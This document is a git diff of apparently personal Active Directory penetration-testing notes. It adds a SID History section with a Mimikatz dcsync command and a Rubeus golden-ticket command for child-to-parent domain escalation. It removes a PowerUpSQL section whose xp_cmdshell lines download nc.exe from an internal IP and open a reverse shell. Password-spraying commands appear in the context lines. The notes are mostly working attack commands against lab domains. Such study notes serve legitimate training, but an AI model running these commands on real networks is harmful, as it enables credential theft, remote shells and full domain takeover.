@@ -1,3 +1,12 @@
+- [[Privilege Escalation#AsReproasting]]
+- [[Privilege Escalation#Kerberoasting]]
+- [[Privilege Escalation#Password Spraying]]
+- [[Privilege Escalation#Kerberos Unconstrained Delegation]]
+- [[Privilege Escalation#Kerberos Constrained Delegation]]
+- [[Privilege Escalation#Kerberos Resource-based Constrained Delegation]]
+- [[Privilege Escalation#SID History Abuse]]
+
+---
 ### AsReproasting
 >__Pre-Authentication__ means sending encrypted timestamp before requesting TGT.
 
@@ -134,36 +143,6 @@ Invoke-DomainPasswordSpray -Password Spring2017
 ```powershell
 Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
 ```
-
----
-### PowerUpSQL
-[MS SQL Red Teaming](https://h4ms1k.github.io/Red_Team_MSSQL_Server/#)
-
-__SQL Servers__
-```powershell
-Get-SQLInstanceDomain
-```
-
-__DB links__
-```powershell
-Get-SQLServerLink -Instance devsrv.garrison.castle.local
-```
-
-```powershell
-Get-SQLServerLinkCrawl -Instance devsrv.garrison.castle.local -Verbose
-```
-
-__Download nc__
-```powershell
-Get-SQLServerLinkCrawl -Instance devsrv.garrison.castle.local -Query
-`exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadFile('http://172.16.99.11/nc.exe','C:\Windows\Temp\nc.exe')"`
-```
-
-__Reverse Shell__
-```powershell
-Get-SQLServerLinkCrawl -Instance devsrv.garrison.castle.local -Query `exec master..xp_cmdshell "C:\Windows\Temp\nc.exe -e cmd 172.16.10.1 9001"`
-```
-
 
 ---
 ### Kerberos Unconstrained Delegation
@@ -326,6 +305,46 @@ winrs -r:dcorp-mgmt cmd.exe
 - sIDHistory can be abused in two ways of escalating privileges within a forest:
 	- krbtgt hash of the child
 	- Trust tickets
+##### Requirements
+- The KRBTGT hash for the child domain
+- The SID for the child domain
+- The name of a target user in the child domain (does not need to exist!)
+- The FQDN of the child domain.
+- The SID of the Enterprise Admins group of the root domain.
+- With this data collected, the attack can be performed with Mimikatz.
+
+#### Child to Parent - KRBTGT
+__Obtaining the KRBTGT Account's NT Hash using Mimikatz__
+```powershell
+lsadump::dcsync /user:LOGISTICS\krbtgt
+```
+__Get DomainSID__
+- This is also visible in the Mimikatz output above.
+```powershell
+Get-DomainSID
+```
+__Obtaining Enterprise Admins Group's SID using Get-DomainGroup__
+```powershell
+Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
+```
+
+```powershell
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+```
+
+__Get Parent Domain SID__
+```powershell
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+```
+__Create GOLDEN Ticket__
+- rc4: krbtgt hash
+- domain: child domain
+- sid: child domain SID
+- sids: "Enterprise Admins"
+- user: Any valid or invalid user
+```powershell
+Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+```
 
 #### Child to Parent - Trust Key Attack
 
@@ -335,7 +354,7 @@ Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
 ```
 or
 ```powershell
-Invoke-Mimikatz -Command '"lsadump::dcsync/user:dcorp\mcorp$"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
 ```
 or
 ```powershell
